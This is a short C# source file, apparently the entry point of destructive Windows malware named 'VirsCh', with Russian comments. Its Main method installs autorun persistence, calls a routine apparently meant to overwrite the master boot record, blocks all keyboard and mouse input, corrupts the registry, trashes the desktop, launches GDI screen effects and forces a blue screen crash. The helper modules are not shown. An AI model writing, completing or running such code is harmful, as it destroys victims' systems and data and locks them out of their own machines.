using System.Runtime.InteropServices;
using System.Threading;

namespace VirsCh
{
    static class Program
    {
        // Регистрация DLL
        [DllImport("user32.dll")]
        private static extern bool BlockInput(bool block);

        static void Main()
        {
            // Запус всех модулей
            if (!Addition.IsInstalledAR())
                Addition.InstallAR();
            Killer.MBR();
            Addition.RegFun();
            BlockInput(true);
            var rule = new Rules();
            new Thread(() => rule.ShowDialog()).Start();
            new Thread(() => Addition.TrashDestop()).Start();
            new Thread(() => Effect.GDI_payloads()).Start();
            Killer.RegFuck();
            Killer.BSOD();
        }
    }
}
